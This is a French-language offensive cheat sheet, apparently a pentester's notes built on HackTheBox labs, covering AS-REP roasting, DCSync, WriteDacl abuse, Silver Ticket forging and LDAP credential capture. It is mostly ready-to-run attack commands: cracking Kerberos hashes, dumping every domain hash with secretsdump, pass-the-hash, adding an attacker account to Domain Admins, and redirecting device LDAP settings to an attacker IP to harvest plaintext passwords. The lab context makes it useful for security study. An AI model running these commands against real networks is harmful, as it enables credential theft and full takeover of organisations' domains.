# AS-REP Roasting

Exploitation des comptes sans pré-authentification Kerberos pour obtenir des hashes crackables offline.

## Prérequis

- Liste d'utilisateurs du domaine
- Connectivité vers le KDC (port 88)

## Concept

Lorsque **"Do not require Kerberos preauthentication"** est activé :
- Pas de vérification d'identité
- Le KDC retourne un **AS-REP** chiffré avec le mot de passe de l'utilisateur
- L'attaquant peut cracker ce AS-REP offline

## Énumération des comptes vulnérables

### Via Impacket

```bash
# Sans credentials (si LDAP anonyme autorisé)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile hashes.txt

# Avec credentials
impacket-GetNPUsers <DOMAIN>/username:password -dc-ip <DC_IP> -request
```

### Via kerbrute

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> usernames.txt
```

## Exploitation

### 1. Lister les utilisateurs sans pre-auth

```bash
impacket-GetNPUsers htb.local/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Résultat :**
```
$krb5asrep$23$username@DOMAIN:hash...
```

### 2. Cracker les hashes

```bash
# Hashcat (mode 18200 = Kerberos 5 AS-REP)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5asrep asrep_hashes.txt --wordlist=rockyou.txt
```

### 3. Utiliser les credentials

```bash
evil-winrm -i <TARGET> -u username -p 'password'
```

## Automatisation complète

```bash
#!/bin/bash
DOMAIN="htb.local"
DC_IP="10.10.10.161"

# 1. Énumérer utilisateurs
kerbrute userenum -d $DOMAIN --dc $DC_IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt

# 2. AS-REP Roasting
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -usersfile valid_users.txt -format hashcat -outputfile asrep.hash

# 3. Cracker
hashcat -m 18200 asrep.hash rockyou.txt
```

## Avec credentials

Si vous avez déjà un accès au domaine :

```bash
# Lister tous les comptes sans pre-auth
impacket-GetNPUsers domain/user:password -dc-ip <DC_IP> -request
```

**PowerShell (sur cible) :**
```powershell
# Lister comptes avec DONT_REQ_PREAUTH
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

## Notes

- Plus facile que Kerberoasting (pas de credentials nécessaires)
- Hashes souvent plus faibles (utilisateurs legacy)
- Fonctionne même sans compte dans le domaine

---

# DCSync Attack

Simulation du comportement d'un contrôleur de domaine pour demander la réplication des données AD et extraire tous les hashes NTLM du domaine.

## Prérequis

- Compte avec l'un de ces droits :
  - **DS-Replication-Get-Changes** (Replicating Directory Changes)
  - **DS-Replication-Get-Changes-All** (Replicating Directory Changes All)
- Ou membre de : Domain Admins, Enterprise Admins, Administrators

## Concept

DCSync abuse le protocole **DRS (Directory Replication Service)** :
- Normalement utilisé par les DC pour se synchroniser
- L'attaquant simule un DC et demande la réplication
- Le DC répond avec tous les secrets (incluant les hashes NTLM)

## Vérification des permissions

### Via BloodHound

```cypher
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p
```

### Via PowerShell

```powershell
# Vérifier les ACL sur le domaine
(Get-Acl "AD:\DC=domain,DC=local").Access | Where-Object {$_.ActiveDirectoryRights -like "*Replication*"}
```

## Exploitation

### 1. Ajouter les permissions DCSync (si WriteDacl)

**Via PowerView :**
```powershell
# Importer PowerView
Import-Module .\PowerView.ps1

# Ajouter DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync -Verbose
```

**Via aclpwn (Linux) :**
```bash
aclpwn -f username -t htb.local --domain htb.local --server <DC_IP> -du domain\\user -dp password
```

### 2. Dump des hashes

**Via Impacket :**
```bash
impacket-secretsdump domain/username:password@<DC_IP>

# Avec hash
impacket-secretsdump -hashes :<NTLM_HASH> domain/username@<DC_IP>

# Dump d'un utilisateur spécifique
impacket-secretsdump domain/username:password@<DC_IP> -just-dc-user Administrator
```

**Résultat :**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
htb.local\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb1f33d17632f8:::
```

**Via Mimikatz (sur Windows) :**
```powershell
lsadump::dcsync /domain:htb.local /user:Administrator
```

### 3. Pass-the-Hash

```bash
evil-winrm -i <DC_IP> -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

## Chaîne d'attaque complète (Forest box htb)

```bash
# 1. Ajouter user au groupe Exchange Windows Permissions
*Evil-WinRM* PS> net group "Exchange Windows Permissions" username /add

# 2. Se reconnecter (nouveau token)
exit
evil-winrm -i <DC_IP> -u username -p 'password'

# 3. Ajouter les permissions DCSync
*Evil-WinRM* PS> Import-Module .\PowerView.ps1
*Evil-WinRM* PS> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync

# 4. DCSync depuis l'attaquant
impacket-secretsdump htb.local/username:'password'@<DC_IP>

# 5. Pass-the-Hash
evil-winrm -i <DC_IP> -u administrator -H <NTLM_HASH>
```

## Variantes

### DCSync d'un utilisateur spécifique

```bash
impacket-secretsdump domain/user:pass@<DC_IP> -just-dc-user krbtgt
```

### DCSync avec Kerberos

```bash
export KRB5CCNAME=ticket.ccache
impacket-secretsdump -k -no-pass domain/user@DC.domain.local
```

## Groupes avec DCSync par défaut

| Groupe | Permissions |
|--------|-------------|
| Domain Admins | Oui |
| Enterprise Admins | Oui |
| Administrators | Oui |
| Domain Controllers | Oui |
| Backup Operators | Partiel |


## Notes

- DCSync = technique très puissante, Domain Admin instantané
- Souvent chaîne d'attaque : WriteDacl → DCSync → Domain Admin
- Alternative silencieuse au dump de NTDS.dit

---

# WriteDacl Abuse

Exploitation du droit **WriteDacl** pour modifier les ACL (Access Control Lists) et s'octroyer des permissions élevées sur des objets AD.

## Prérequis

- Droit **WriteDacl** sur un objet cible
- Outil : PowerView, BloodHound, ou outils natifs AD

## Concept

**WriteDacl** = Peut modifier la DACL (Discretionary Access Control List) d'un objet

Cela permet de :
- S'ajouter n'importe quelle permission
- Modifier les permissions d'autres utilisateurs
- Escalader vers Domain Admin

## Énumération

### Via BloodHound

```cypher
# Trouver les chemins vers des objets avec WriteDacl
MATCH p=(u:User)-[r:WriteDacl]->(n) RETURN p

# Chemins vers Domain Admins via WriteDacl
MATCH p=shortestPath((u:User)-[r:WriteDacl*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

### Via PowerView

```powershell
# Importer PowerView
Import-Module .\PowerView.ps1

# Trouver objets où on a WriteDacl
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}
```

## Exploitation

### 1. WriteDacl sur le Domaine → DCSync

**Objectif :** S'octroyer les droits DCSync

```powershell
# Via PowerView
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync -Verbose
```

**Vérifier :**
```powershell
Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs | 
  Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser username).objectsid}
```

**Exploiter :**
```bash
impacket-secretsdump domain/username:password@<DC_IP>
```

### 2. WriteDacl sur un Groupe → Ajouter membre

**Objectif :** S'ajouter à Domain Admins

```powershell
# Méthode 1: Via PowerView
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity username -Rights WriteMembers

net group "Domain Admins" username /add /domain
```

**Méthode 2: ADSI**
```powershell
$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local"
$user = [ADSI]"LDAP://CN=username,CN=Users,DC=domain,DC=local"
$group.Add($user.Path)
```

### 3. WriteDacl sur un Utilisateur → Reset Password

**Objectif :** Changer le mot de passe d'un admin

```powershell
# S'octroyer ForceChangePassword
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity username -Rights ResetPassword

# Changer le password
$cred = ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $cred
```

### 4. WriteDacl sur GPO → Privilege Escalation

```powershell
# Ajouter AllExtendedRights sur une GPO
Add-DomainObjectAcl -TargetIdentity "Default Domain Policy" -PrincipalIdentity username -Rights All

# Modifier la GPO pour ajouter un admin local
# (nécessite outils GPO)
```

## Chaîne d'attaque Forest

```bash
# Contexte: Account Operators → WriteDacl sur Exchange Windows Permissions → WriteDacl sur Domain

# 1. Ajouter user au groupe Exchange Windows Permissions
net group "Exchange Windows Permissions" svc-alfresco /add

# 2. Importer PowerView
Import-Module .\PowerView.ps1

# 3. S'octroyer DCSync
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync

# 4. DCSync
impacket-secretsdump htb.local/svc-alfresco:'password'@10.10.10.161

# 5. Pass-the-Hash Admin
evil-winrm -i 10.10.10.161 -u administrator -H <HASH>
```

## Automatisation avec aclpwn

```bash
# Installation
pip3 install aclpwn

# Exploitation automatique
aclpwn -f username -ft user -t htb.local -tt domain --domain htb.local --server <DC_IP> -du domain\\username -dp password

# Dry-run (voir le chemin sans exploiter)
aclpwn -f username -t htb.local --domain htb.local --server <DC_IP> -du domain\\username -dp password --dry
```

## Notes

- WriteDacl = permission très puissante souvent oubliée
- Combiné avec DCSync = Domain Admin
- Souvent chainé depuis Account Operators, Exchange permissions


---
# Silver Ticket

## Requirements
- NTLM hash du compte de service
- Domain SID
- Service Principal Name (SPN)

## Steps

### 1. Calculer le hash NTLM
```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```

### 2. Obtenir le Domain SID

**Via MSSQL:**
```sql
SELECT SUSER_SID();
# Résultat hex: 0x0105000000...
# Convertir avec script Python (voir Tools/SID-Conversion.md)
```

**Via rpcclient:**
```bash
rpcclient -U "user%password" <DC_IP>
rpcclient $> lsaquery
```

**Via PowerShell:**
```powershell
(Get-ADDomain).DomainSID.Value
```

### 3. Identifier les groupes privilégiés

```sql
# Récupérer le RID d'un groupe
SELECT SUSER_SID('DOMAIN\GroupName');
```

### 4. Définir le SPN

| Service | Format |
|---------|--------|
| MSSQL | `MSSQLSvc/hostname.domain.com:1433` |
| CIFS | `cifs/hostname.domain.com` |
| HTTP | `HTTP/hostname.domain.com` |
| LDAP | `ldap/hostname.domain.com` |

### 5. Générer le ticket

```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> \
  -spn <SPN> \
  -groups <GROUP_RIDs> \
  -user-id <USER_RID> \
  <USERNAME>
```

**Exemple:**
```bash
impacket-ticketer \
  -nthash a1b2c3d4... \
  -domain-sid "S-1-5-21-123456789-123456789-123456789" \
  -domain CORP.LOCAL \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  -groups 512,1105 \
  -user-id 500 \
  Administrator
```

### 6. Utiliser le ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## RIDs importants

| RID | Nom |
|-----|-----|
| 500 | Administrator |
| 512 | Domain Admins |
| 519 | Enterprise Admins |

---

# LDAP Credential Capture

Forcer une application à s'authentifier vers un serveur LDAP contrôlé pour capturer les credentials.

## Prérequis

- Interface web avec configuration LDAP modifiable
- Responder en écoute
- Connectivité réseau LDAP (port 389)

## Steps

### 1. Identifier la cible

Rechercher des formulaires permettant de configurer :
- Server Address / LDAP Server
- Port (389 par défaut)
- Username / Password

**Exemples courants :**
- Panels d'administration d'imprimantes
- Interfaces de configuration LDAP
- Systèmes de monitoring
- Applications avec authentification LDAP

### 2. Lancer Responder

```bash
sudo responder -I tun0
```

### 3. Modifier la configuration LDAP

Dans l'interface web, changer le Server Address vers votre IP :

```
Server Address: <ATTACKER_IP>
Port: 389
Username: (laisser tel quel)
Password: (laisser tel quel)
```

### 4. Trigger la connexion

Cliquer sur "Update" ou "Test Connection" pour forcer l'application à se connecter.

### 5. Capturer les credentials

Responder affiche :
```
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : domain\username
[LDAP] Cleartext Password : P@ssw0rd123!
```

## Utilisation des credentials

### Via WinRM

```bash
evil-winrm -i <TARGET> -u username -p 'password'
```

### Via SMB

```bash
smbclient.py domain/username:'password'@<TARGET>
```

### Via RDP

```bash
xfreerdp /u:username /p:'password' /v:<TARGET>
```

## Variantes

### Modification de configuration mail/SMTP

```
SMTP Server: <ATTACKER_IP>
Port: 25/587
```

### Modification de serveur Syslog

```
Syslog Server: <ATTACKER_IP>
Port: 514
```

### Modification de serveur NTP

```
NTP Server: <ATTACKER_IP>
Port: 123
```

## Notes

- Credentials souvent en **clair** (pas de hash)
- Fonctionne avec services nécessitant authentification LDAP/AD
- Alternative à Responder : `nc -lvnp 389` pour voir la requête brute
